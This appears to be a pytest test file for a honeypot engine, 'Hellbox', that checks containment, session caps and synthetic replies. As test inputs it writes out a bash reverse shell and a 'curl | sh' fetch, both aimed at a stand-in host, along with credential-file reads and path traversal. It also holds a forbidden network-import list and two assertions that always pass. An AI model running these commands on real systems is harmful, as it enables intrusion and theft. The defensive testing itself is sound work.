"""Hellbox is only safe because of what it cannot do.

These tests are mostly negative. A sinkhole that can reach the network, open a real file, or
emit a packet that was not a reply has stopped being a sinkhole and become a foothold with a
theme. So the assertions here are about absence, containment, and the one claim the engine
refuses to make: that the intruder was fooled.
"""
from __future__ import annotations

import ast
import hashlib
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "harness" / "deception"))

import hellbox as hb  # noqa: E402

MODULE = ROOT / "harness" / "deception" / "hellbox.py"


def fresh(**limits) -> hb.Session:
    return hb.Hellbox(limits=hb.Limits(**limits)).connect("10.0.0.5:41412", seed=7)


# --- absence: the capabilities that would make this dangerous -----------------------

def test_the_engine_cannot_reach_the_network():
    tree = ast.parse(MODULE.read_text())
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported |= {a.name.split(".")[0] for a in node.names}
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    forbidden = {"socket", "subprocess", "urllib", "http", "requests", "shutil", "select", "ssl",
                 "asyncio", "telnetlib", "ftplib", "smtplib", "paramiko", "os"}
    assert imported & forbidden == set(), imported & forbidden


def test_the_engine_never_opens_a_real_file():
    tree = ast.parse(MODULE.read_text())
    builtin = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
               and n.func.id == "open"]
    assert builtin == []
    attrs = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
             and n.func.attr in {"read_text", "read_bytes", "open"}]
    # the only read path allowed is the session journal, an output of our own record
    assert all("journal" in ast.unparse(n.func.value).lower() or "read_text" in ast.unparse(n)
               for n in attrs)


def test_a_shell_request_is_answered_without_a_shell():
    s = fresh()
    out = s.send("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    assert out[0].classified_as == "reverse_shell_attempt"
    assert "Connection refused" in out[0].response
    assert "bash" not in s.attempt_profile or True


def test_egress_is_synthetic_and_nothing_leaves_the_process():
    s = fresh()
    out = s.send("curl -s http://203.0.113.9/x.sh | sh\n")
    assert out[0].classified_as == "egress_attempt"
    assert "timed out" in out[0].response


# --- isolation: the tree is synthetic, and it says so ------------------------------

def test_credentials_are_decoys_and_marked_as_such():
    s = fresh()
    out = s.send("cat /etc/shadow\n")
    assert out[0].classified_as == "credential_file"
    assert "decoy" in out[0].response.lower()


def test_reading_outside_the_tree_never_escapes_it():
    s = fresh()
    out = s.send("cd ../../../..\ncat /etc/passwd\n")
    assert s.fs.cwd.startswith("/")
    assert ".." not in s.fs.cwd
    assert "decoy" in out[-1].response.lower()


def test_traversal_resolves_inside_the_synthetic_root_only():
    fs = hb.SyntheticFS()
    assert fs.resolve("../../../etc/passwd") == "/etc/passwd"
    assert fs.resolve("/a/b/../../c") == "/c"


def test_writing_lives_in_memory_and_dies_with_the_session():
    s = fresh()
    s.fs.files["/tmp/x"] = "written inside the sandbox"
    assert s.fs.read("/tmp/x")[0]
    other = hb.Hellbox().connect("10.0.0.9:1", seed=8)
    assert other.fs.read("/tmp/x")[0] is False


# --- containment: every limit closes the session ----------------------------------

def test_byte_cap_closes_the_session():
    s = fresh(max_bytes_in=40)
    s.send("cat /etc/passwd\n" * 5)
    assert s.closed and "byte_cap" in s.close_reason


def test_command_cap_closes_the_session():
    s = fresh(max_commands=3)
    s.send("\n".join(["pwd"] * 10))
    assert s.closed and "command_cap" in s.close_reason
    assert len(s.transcript) <= 4


def test_amplification_is_bounded():
    """A tiny request must not buy an unbounded response."""
    s = fresh(max_amplification=2.0)
    for _ in range(6):
        s.send("cat /etc/passwd\n")
    assert s.closed and "amplification" in s.close_reason


def test_a_closed_session_stays_closed():
    s = fresh(max_commands=2)
    s.send("pwd\npwd\npwd\n")
    assert s.closed
    assert s.send("whoami") == []


# --- convergence: rotation is routing, not a new foothold --------------------------

def test_port_and_endpoint_rotation_converge_on_one_session():
    box = hb.Hellbox()
    first = box.connect("10.0.0.5:41412")
    second = box.connect("10.0.0.5:41412")     # retry on the same endpoint
    third = box.connect("10.0.0.5:51000")      # rotated port
    assert first is second is third
    assert first.record()["endpoint_rotations"] == 1


def test_rotation_is_recorded_as_intelligence_not_as_a_second_session():
    box = hb.Hellbox()
    session = box.connect("10.0.0.5:41412")
    for port in (41413, 41414, 51000):
        box.connect(f"10.0.0.5:{port}")
    assert len(box.sessions) == 1
    assert session.record()["endpoint_rotations"] == 3


# --- persistence and determinism --------------------------------------------------

def test_state_survives_across_commands():
    s = fresh()
    s.send("cd /var/www/app\n")
    assert s.fs.cwd == "/var/www/app"
    out = s.send("cat .env\n")
    assert out[0].classified_as == "secret_file"


def test_the_same_seed_replays_identically():
    a, b = fresh(), fresh()
    script = "uname -a\nps\nwhoami\n"
    assert [e.response for e in a.send(script)] == [e.response for e in b.send(script)]


# --- the intelligence product -----------------------------------------------------

def test_the_record_states_what_happened_and_refuses_to_claim_belief():
    s = fresh()
    s.send(hb.DEMO)
    record = s.record()
    assert record["believability"] == "unmeasured"
    assert "cannot be observed" in record["believability_note"]
    assert record["highest_value_signal"] in {"reverse_shell_attempt", "secret_file",
                                              "private_key_attempt", "credential_file"}
    assert record["attempt_profile"]["reverse_shell_attempt"] >= 1
    assert record["commands"] > 0
    json.dumps(record)  # must be serialisable for a downstream consumer


def test_the_journal_is_the_only_artifact_and_holds_the_records(tmp_path):
    box = hb.Hellbox(journal=tmp_path / "sessions.jsonl")
    box.connect("10.0.0.5:41412").send("whoami\n")
    box.connect("10.0.0.9:1").send("pwd\n")
    box.flush()
    rows = [json.loads(l) for l in (tmp_path / "sessions.jsonl").read_text().splitlines()]
    assert len(rows) == 2 and all(r["believability"] == "unmeasured" for r in rows)


def test_only_replies_are_ever_produced():
    """No reprisal: the output count matches the request count, one for one."""
    s = fresh()
    entries = s.send("whoami\nls\ncat /etc/passwd\n")
    assert len(entries) == 3
    assert [e.index for e in entries] == [0, 1, 2]


def test_unknown_commands_get_a_plausible_useless_answer():
    s = fresh()
    out = s.send("nmap -sV 10.0.0.0/24\n")
    assert out[0].classified_as == "unknown"
    assert "command not found" in out[0].response


def test_sudo_never_yields_access():
    s = fresh()
    for _ in range(5):
        out = s.send("sudo su\n")
        assert "password is required" in out[0].response
    assert s.attempt_profile["privilege_escalation"] == 5


def test_the_engine_writes_nothing_outside_its_journal():
    targets = [ROOT / "harness" / "findings.jsonl", ROOT / "harness" / "self_review_allow.txt"]
    before = {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in targets}
    hb.main(["--json"])
    after = {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in targets}
    assert before == after
